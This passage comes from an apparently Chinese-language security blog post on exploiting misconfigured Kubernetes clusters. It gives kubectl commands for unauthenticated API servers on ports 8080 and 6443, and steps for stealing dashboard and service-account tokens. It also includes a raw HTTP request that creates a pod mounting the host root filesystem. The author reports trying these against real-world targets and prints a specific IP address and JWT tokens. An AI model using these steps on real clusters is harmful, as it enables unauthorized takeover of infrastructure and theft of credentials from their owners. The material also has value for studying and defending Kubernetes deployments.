<span class="string">usr-local-share-ca-certificates</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/usr/share/ca-certificates</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">usr-share-ca-certificates</span></span><br><span class="line"><span class="attr">status:</span> &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后可以查看一些配置参数，这个文件是会被实时读取的，改过配置文件后，不需要重启服务</p>
<p>其中未授权端口就是insecure-port端口设置，<code>    - --insecure-port=0</code>看了很多文章并没说那个版本以前会默认开启，只说了1.20版本后该选项已无效化，也就是说，1.20版本后，该参数直接没了，如果想启用，需要管理者手动添加。</p>
<p>我们将这里改为8080，并且加上bind-address，保存就会看到开启了8080端口</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">--insecure-port=8080</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">--insecure-bind-address=0.0.0.0</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/k8s/image-20231228092959882.png" alt="image-20231228092959882"></p>
<p><img src="/images/k8s/image-20231228093032460.png" alt="image-20231228093032460"><br>这里笔者用<a target="_blank" rel="noopener" href="http://ip:8080/%E8%AE%BF%E9%97%AE%E6%88%90%E5%8A%9F">http://ip:8080/访问成功</a></p>
<p><img src="/images/k8s/image-20231228093318336.png" alt="image-20231228093318336"></p>
<p><a target="_blank" rel="noopener" href="https://ip:8080/">https://ip:8080/</a>  https没有成功</p>
<p>在实战中显示这个并不一定能利用，要显示很长这种才可能利用。</p>
<p><img src="/images/k8s/image-20231228112148534.png" alt="image-20231228112148534"></p>
<p>接下来利用，直接在kali中安装kubectl ，apt install kubectl 即可<br>执行命令查看node，<br><code>kubectl -s ip:8080 get node</code></p>
<p><img src="/images/k8s/image-20231228093916392.png" alt="image-20231228093916392"></p>
<p>即可看到服务器上的node</p>
<p><code>kubectl -s ip:8080 get namespace</code><br><img src="/images/k8s/image-20231228100247157.png" alt="image-20231228100247157"></p>
<p><code>kubectl -s ip:8080 get pods -n kube-system</code></p>
<p>列出某个namespace的pods</p>
<p><img src="/images/k8s/image-20231228100514838.png" alt="image-20231228100514838"></p>
<p><code>kubectl -s ip:8080 --namespace=kube-system exec -it etcd-racknerd-6d0a89 ip a</code></p>
<p>使用这个命令就可以在某个pod上执行命令了</p>
<p><img src="/images/k8s/image-20231228101628094.png" alt="image-20231228101628094"></p>
<p><img src="/images/k8s/image-20231228101658311.png" alt="image-20231228101658311"></p>
<p><code>kubectl -s ip:8080 --namespace=kube-system exec -it etcd-racknerd-6d0a89 sh</code></p>
<p>笔者在执行交互命令的时候，用bash没有成功，应该是对方的pod环境没有，sh就有了,这样就可以愉快的命令执行了。这些命令看起来和docker命令差不多。</p>
<p><img src="/images/k8s/image-20231228101830688.png" alt="image-20231228101830688"></p>
<p>我们也可以使用metarget安装一个dvwa，或者php的rce都可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#这个命令会安装一个dvwa的pod，把这个pod放到metarget（namespace）下面</span><br><span class="line">#但是这命令不会将dvwa的端口暴漏出来</span><br><span class="line">./metarget appv install dvwa</span><br><span class="line"></span><br><span class="line">#执行./metarget appv install dvwa --external直接安装dvwa漏洞环境到脆弱的底层基础设施上，并以NodePort形式将端口暴露出来。</span><br><span class="line">#也就是要加个参数--external</span><br><span class="line">./metarget appv install thinkphp-5-0-23-rce --external</span><br></pre></td></tr></table></figure>

<p>笔者在这里搭建了一个dvwa 一个thinkphp的RCE用于测试，暴漏的端口分别是30000和30001</p>
<p><img src="/images/k8s/image-20231228104006919.png" alt="image-20231228104006919"></p>
<p><img src="/images/k8s/image-20231228104102865.png" alt="image-20231228104102865"></p>
<p>未授权漏洞也是可以看到的</p>
<p><img src="/images/k8s/image-20231228104156293.png" alt="image-20231228104156293"></p>
<p>命令总结</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubectl -s 27.223.94.14:8080 get node</span><br><span class="line">kubectl -s 27.223.94.14:8080 get namespace</span><br><span class="line">kubectl -s ip:8080 get pods -n metarget</span><br><span class="line">kubectl -s ip:8080 --namespace=kube-system exec -it kube-scheduler-racknerd-6d0a89 bash</span><br></pre></td></tr></table></figure>

<p>在实战中也是可以利用的，</p>
<h6 id="失败的实战"><a href="#失败的实战" class="headerlink" title="失败的实战"></a>失败的实战</h6><p><img src="/images/k8s/image-20231228111456328.png" alt="image-20231228111456328"></p>
<p>但是在执行命令的时候，试了好几个pod都显示没有空间了，不可思议</p>
<p><img src="/images/k8s/image-20231228111621099.png" alt="image-20231228111621099"></p>
<p>还有这种，列pod中，pod是存在的，但是执行的时候显示不存在，不理解，可以pod清空了？</p>
<p><img src="/images/k8s/image-20231228112827115.png" alt="image-20231228112827115"></p>
<p>这种没有权限的，这种可以参考这个文章，<a target="_blank" rel="noopener" href="https://blog.csdn.net/zhuyongru/article/details/114060199">https://blog.csdn.net/zhuyongru/article/details/114060199</a><br>大致意思就是对方开启了RBAC规则，简单的来说就是apiserver没有访问kubelet IPI的权限，这样就403了</p>
<p><img src="/images/k8s/image-20231228135913246.png" alt="image-20231228135913246"></p>
<h6 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h6><p><img src="/images/k8s/image-20231228142255049.png" alt="image-20231228142255049"></p>
<h5 id="6443端口未授权"><a href="#6443端口未授权" class="headerlink" title="6443端口未授权"></a>6443端口未授权</h5><p>如果不小心，将”system:anonymous”用户绑定到”cluster-admin”用户组，从而使6443 端口允许匿名用户以管理员权限向集群内部下发指令，<br>默认访问6443端口会显示<img src="/images/k8s/image-20231228090722306.png" alt="image-20231228090722306"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;Status&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">    </span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;status&quot;</span>: <span class="string">&quot;Failure&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;forbidden: User \&quot;system:anonymous\&quot; cannot get path \&quot;/\&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reason&quot;</span>: <span class="string">&quot;Forbidden&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;details&quot;</span>: &#123;</span><br><span class="line">    </span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;code&quot;</span>: <span class="number">403</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据message的字面意思也很好理解，也就是anonymous不能访问这个path，<br>这个时候管理员不小心使用了命令，<code>kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous</code><br>那么就会导致anonymous可以任意访问了，</p>
<p><code>https://ip:6443/api/v1/namespaces/default/pods</code><br>通过浏览器获取到所有pods，</p>
<p><img src="/images/k8s/image-20240102155136747.png" alt="image-20240102155136747"></p>
<p>这个时候就可以利用了，和上面的8080端口未授权利用方式差不多</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">获取到所有node</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 get node</span><br><span class="line">#获取到所有namespace</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 get namespace</span><br><span class="line">#获取默认pod，注意这里没有加namespace是默认pod</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 get pods</span><br></pre></td></tr></table></figure>

<p>这里可以注意到让输入账户密码，随便输即可。</p>
<p><img src="/images/k8s/image-20240102161111140.png" alt="image-20240102161111140"></p>
<p><img src="/images/k8s/image-20240102161338261.png" alt="image-20240102161338261"></p>
<p>如果在查看namespace的时候发现有dashboard的话，那么说明环境中存在面板，这个时候，我们就可以获取到面板的token，来登录面板。</p>
<p><img src="/images/k8s/image-20240102171909311.png" alt="image-20240102171909311"></p>
<p>可以看到有kubernetes-dashboard，输入下面的命令到浏览器中</p>
<p><code>https://ip:6443/api/v1/namespaces/kubernetes-dashboard/secrets/</code></p>
<p>经过测试，在其中会有多个pods，带有admin-user-token的应该就是这个pod的token了，拿出来base64一下，不要解jwt，ey开头的值，</p>
<p><img src="/images/k8s/image-20240102172332395.png" alt="image-20240102172332395"></p>
<p><img src="/images/k8s/image-20240102172520549.png" alt="image-20240102172520549"></p>
<p>如果环境对外映射了面板，那么就可以愉快的登录了。测试环境中好像都是映射到9090端口。<br>这样就直接托管了整个k8s。</p>
<p><img src="/images/k8s/image-20240102172819323.png" alt="image-20240102172819323"></p>
<p>这里会有小伙伴有疑问，上面用kubectl –insecure-skip-tls-verify -s <a target="_blank" rel="noopener" href="https://ip:6443/">https://ip:6443</a> -n kube命令打着打着，怎么跳到用浏览器请求了，获取token了。<br>这里其实是因为，笔者在这里太菜了，上面8080端口的未授权利用可以获取到pods namespace等信息，那便是可以获取到token的，这里提前说一下其实获取token的作用就是登录面板的，下面会说到，在宿主主机上执行<code>kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath=&quot;&#123;.secrets[0].name&#125;&quot;) -o go-template=&quot;&#123;&#123;.data.token | base64decode&#125;&#125;&quot;</code><br>便可获取到token，它是用来登录面板的，那么同理可得，如果6443端口存在未授权，那么这里就可以获取token，笔者在这里试了好多种linux转义，都没有成功，如果有成功的大师傅可以留言，感谢感谢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admpath=\&quot;&#123;.secrets[0].name&#125;\&quot;) -o go-template=\&quot;&#123;&#123;.data.token \| base64decode&#125;&#125;\&quot;</span><br></pre></td></tr></table></figure>



<p><img src="/images/k8s/image-20240102212933474.png" alt="image-20240102212933474"></p>
<p>这里如果没有k8面板的话，也没有关系，直接使用浏览器创建pods也可行，</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v1/namespaces/default/pods</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ip:6443</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1180</span><br><span class="line"></span><br><span class="line"><span class="swift">&#123;</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;Pod&quot;</span>,</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;metadata&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;annotations&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">            <span class="string">&quot;kubectl.kubernetes.io/last-applied-configuration&quot;</span>: <span class="string">&quot;&#123;<span class="subst">\&quot;</span>apiVersion<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>v1<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>kind<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>Pod<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>metadata<span class="subst">\&quot;</span>:&#123;<span class="subst">\&quot;</span>annotations<span class="subst">\&quot;</span>:&#123;&#125;,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>test-44441<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>namespace<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>default<span class="subst">\&quot;</span>&#125;,<span class="subst">\&quot;</span>spec<span class="subst">\&quot;</span>:&#123;<span class="subst">\&quot;</span>containers<span class="subst">\&quot;</span>:[&#123;<span class="subst">\&quot;</span>image<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>nginx:1.14.2<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>test-44441<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>volumeMounts<span class="subst">\&quot;</span>:[&#123;<span class="subst">\&quot;</span>mountPath<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>/host<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>host<span class="subst">\&quot;</span>&#125;]&#125;],<span class="subst">\&quot;</span>volumes<span class="subst">\&quot;</span>:[&#123;<span class="subst">\&quot;</span>hostPath<span class="subst">\&quot;</span>:&#123;<span class="subst">\&quot;</span>path<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>/<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>type<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>Directory<span class="subst">\&quot;</span>&#125;,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>host<span class="subst">\&quot;</span>&#125;]&#125;&#125;<span class="subst">\n</span>&quot;</span></span></span><br><span class="line"><span class="swift">        &#125;,</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test-44441&quot;</span>,</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;default&quot;</span></span></span><br><span class="line"><span class="swift">    &#125;,</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;spec&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;containers&quot;</span>: [</span></span><br><span class="line"><span class="swift">            &#123;</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;image&quot;</span>: <span class="string">&quot;nginx:1.14.2&quot;</span>,</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test-44441&quot;</span>,</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;volumeMounts&quot;</span>: [</span></span><br><span class="line"><span class="swift">                    &#123;</span></span><br><span class="line"><span class="swift">                        <span class="string">&quot;mountPath&quot;</span>: <span class="string">&quot;/host&quot;</span>,</span></span><br><span class="line"><span class="swift">                        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;host&quot;</span></span></span><br><span class="line"><span class="swift">                    &#125;</span></span><br><span class="line"><span class="swift">                ]</span></span><br><span class="line"><span class="swift">            &#125;</span></span><br><span class="line"><span class="swift">        ],</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;volumes&quot;</span>: [</span></span><br><span class="line"><span class="swift">            &#123;</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;hostPath&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">                    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span>,</span></span><br><span class="line"><span class="swift">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Directory&quot;</span></span></span><br><span class="line"><span class="swift">                &#125;,</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;host&quot;</span></span></span><br><span class="line"><span class="swift">            &#125;</span></span><br><span class="line"><span class="swift">        ]</span></span><br><span class="line"><span class="swift">    &#125;</span></span><br><span class="line"><span class="swift">&#125;</span></span><br><span class="line"><span class="swift"></span></span><br></pre></td></tr></table></figure>

<p>回显201就表示创建成功了，</p>
<p><img src="/images/k8s/image-20240103094619945.png" alt="image-20240103094619945"></p>
<p><img src="/images/k8s/image-20240103094607986.png" alt="image-20240103094607986"></p>
<p>浏览器访问也就可以看到，也可以命令执行</p>
<p><img src="/images/k8s/image-20240103094714518.png" alt="image-20240103094714518"></p>
<p>笔者在测试的时候，一开始创建pod会失败，<br><img src="/images/k8s/image-20240103094849583.png" alt="image-20240103094849583"></p>
<p>输入kubectl describe pod test-44441 –namespace default，可以看到相关的报错</p>
<p><img src="/images/k8s/image-20240103095034621.png" alt="image-20240103095034621"></p>
<p>显示tomanyrequest，应该是拉取的太快了，</p>
<p><img src="/images/k8s/image-20240103095146163.png" alt="image-20240103095146163"></p>
<p>docker官方的说法是没登陆6小时拉去100，登录了之后6小时拉去200。应该是拉去太快了。<br>在该机器上执行命令<code>kubectl --insecure-skip-tls-verify -s https://ip:6443 --namespace=default exec -it test-44441 bash</code></p>
<p><img src="/images/k8s/image-20240103100033394.png" alt="image-20240103100033394"></p>
<p>感觉在实战中，这种创建pod的操作用不上，因为这里漏洞是未授权，而未授权可以接管整个k8s集群，那么再去创建一个pod起步多此一举。当然也可以用做是一个跳板，或者入口机。</p>
<h5 id="失败的从pod到api-server"><a href="#失败的从pod到api-server" class="headerlink" title="失败的从pod到api server"></a>失败的从pod到api server</h5><p>看了这个大师傅的文章</p>
<p><code>https://annevi.cn/2020/12/21/%e5%8d%8e%e4%b8%ba%e4%ba%91ctf-cloud%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3%e4%b9%8bk8s%e6%b8%97%e9%80%8f%e5%ae%9e%e6%88%98/</code></p>
<p>大师傅的文章，是打华为云的比赛，在一个pod下面拿到了一个shell，然后从这个pod查看/run/secrets/kubernetes.io/serviceaccount/token文件获取了api-server的token，然后通过这个token 接管整个集群，从而达到了比赛的非预期。<br>那么思考，这个问题能不能在测试中利用。经过测试是不可以的。也不能说不可以，只能说鉴权不够，师傅的比赛环境，是管理员配置错误所导致的。</p>
<h6 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h6><p>首先如果我们进去一个pod之后，我们查看这个/run/secrets/kubernetes.io/serviceaccount/token文件，是所有权限都可以查看的，777。<br>大师傅在打比赛时创建的配置文件如下，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">clusters:</span><br><span class="line">- cluster:</span><br><span class="line">    insecure-skip-tls-verify: true</span><br><span class="line">    server: https://10.247.0.1</span><br><span class="line">  name: cluster-name</span><br><span class="line">contexts:</span><br><span class="line">- context:</span><br><span class="line">    cluster: cluster-name</span><br><span class="line">    namespace: test</span><br><span class="line">    user: admin</span><br><span class="line">  name: admin</span><br><span class="line">current-context: admin</span><br><span class="line">kind: Config</span><br><span class="line">preferences: &#123;&#125;</span><br><span class="line">users:</span><br><span class="line">- name: admin</span><br><span class="line">  user:</span><br><span class="line">    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w</span><br></pre></td></tr></table></figure>

<p><img src="/images/k8s/image-20231228170140604.png" alt="image-20231228170140604"></p>
<p>可以看到配置文件中的权限是admin的，所以，想使用这个pod拿到shell，获取token打apiserver。</p>
<p>这里笔者在测试的时候，似乎这个pod连接不到apiserver，但是apiserver显示的确实是这里</p>
<p><img src="/images/k8s/image-20231228170625883.png" alt="image-20231228170625883"></p>
<p><img src="/images/k8s/image-20231228170434309.png" alt="image-20231228170434309"></p>
<p>这里比较我们两个的token</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#我的 </span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6IkxES1FJRlNRcXVYenlhV0sxSWZrUVlOamxvR0JscTE1NGlmT1YyX1dLdkEifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJtZXRhcmdldCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZWZhdWx0LXRva2VuLWpnOW5yIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImRlZmF1bHQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI1MGRlOTI3My02ODczLTRiNzgtYjc3OS0yNGUzMTkwZDQzNmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6bWV0YXJnZXQ6ZGVmYXVsdCJ9.J07xNTfoXgXgFZCrlznwvA8v9h7_nokBxI4oWgml9x7S4L4UudHEdoQW8K7jBeNumLdMPjZ6bqi2A3e7D1S0iyHlxHbOeC9tigmy_FRTNKYIN5gziDhYvU393CeM8Juw9JcyAgYrigbbewzo61k-5a9EkTLPiHELbzKhrMwJLpuOiOdG2ISOxNGEqGjABOjGAqjzDHuWyM2XyeO5_FlLuQ1RA0nEO69U_Jfw29S5GBBfXZs4QyopsoyiR0ujW4nI3jYAGXIU37JhSsjkUDCRdPjgh4mp4dRRdUD8hH6rhZkTk30bBuc0y2ECwTHTTQd8G-QdooR5yckLwV_3l4Ww-w</span><br></pre></td></tr></table></figure>

<p><img src="/images/k8s/image-20231228171126046.png" alt="image-20231228171126046"></p>
<p>大师傅的</p>
<p><img src="/images/k8s/image-20231228171159202.png" alt="image-20231228171159202"></p>
<p>可以看到，两者相差不多，且都是system:serviceaccount:default:default”，<br>这里猜测应该是管理员将将”system:serviceaccount”用户绑定到”cluster-admin”用户组，从而使得非预期存在，也就直接打通了apiserver</p>
<p><img src="/images/k8s/image-20231228171410372.png" alt="image-20231228171410372"></p>
<h5 id="获取宿主机权限-通过k8s-dashboard，创建特权Pods"><a href="#获取宿主机权限-通过k8s-dashboard，创建特权Pods" class="headerlink" title="获取宿主机权限-通过k8s dashboard，创建特权Pods"></a>获取宿主机权限-通过k8s dashboard，创建特权Pods</h5><h6 id="正常情况环境搭建"><a href="#正常情况环境搭建" class="headerlink" title="正常情况环境搭建"></a>正常情况环境搭建</h6><p>出现改问题的原因是因为在启动dashborad的时候，管理员为了方便，修改了配置，跳过了登录。<br>首先安装dashborad</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.2.0/aio/deploy/recommended.yaml</span><br><span class="line">vim recommended.yaml</span><br></pre></td></tr></table></figure>

<p>下载完成后，不可以直接访问，要起一下<br><code>kubectl apply -f recommended.yaml</code><br>然后在做映射<br><code> kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard 9090:80</code>,<br>将80端口映射出去，如果不行就映射443<br><code>kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard 9090:443</code></p>
<p><img src="/images/k8s/image-20231229093200392.png" alt="image-20231229093200392"></p>
<p>这个时候应该还是访问不到到，因为没在配置文件中把访问ip改掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim recommended.yaml`后</span><br><span class="line">- -- insecure-bind-address=0.0.0.0</span><br><span class="line">把这个加进去，然后</span><br><span class="line">kubectl apply -f recommended.yaml</span><br></pre></td></tr></table></figure>

<p><img src="/images/k8s/image-20231229104337062.png" alt="image-20231229104337062"></p>
<p>root@bohemian:/tools/k8syaml# kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard  9090:443<br>Forwarding from 127.0.0.1:9090 -&gt; 8443<br>Forwarding from [::1]:9090 -&gt; 8443</p>
<p>这种方式如果映射不成功的话，可以试试下面这种映射方式<br><code>kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard --address 0.0.0.0 9090:443</code></p>
<p>然后用google访问似乎不行，换成火狐就可以了<br>这里要注意，yaml的文本是非常严格的，笔者上图中的<code>- -- insecure-bind-address=0.0.0.0</code>是不对的，不要带那个空格，不让可能会出现connection refused</p>
<p><img src="/images/k8s/image-20240102103354695.png" alt="image-20240102103354695"></p>
<p><img src="/images/k8s/image-20231229104851735.png" alt="image-20231229104851735"></p>
<p><img src="/images/k8s/image-20231229104925231.png" alt="image-20231229104925231"></p>
<p>接下来就是创建账号，当然这里也可以使用从webshell获取到的token进行登录。<br>这里可以注意到，这个账户为admin-user，role为cluster-admin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#sudo vim  account.yaml</span><br><span class="line"></span><br><span class="line"># Creating a Service Account</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">  